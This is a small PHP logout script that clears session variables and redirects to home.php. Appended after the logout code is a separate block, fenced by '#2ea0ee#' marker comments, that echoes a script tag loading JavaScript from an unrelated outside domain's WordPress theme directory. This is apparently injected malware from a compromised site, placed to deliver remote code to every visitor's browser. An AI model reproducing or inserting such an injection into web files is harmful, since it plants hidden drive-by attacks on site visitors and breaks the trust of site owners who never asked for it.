<?
session_start();
if(isset($_SESSION["user_id"])) {
	unset($_SESSION["user_id"]);
	unset($_SESSION["user_name"]);
	unset($_SESSION["name"]);
}
header('Location: home.php');
?>
<?php
#2ea0ee#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224429\"></script>";
echo $srwv;
}
#/2ea0ee#
?>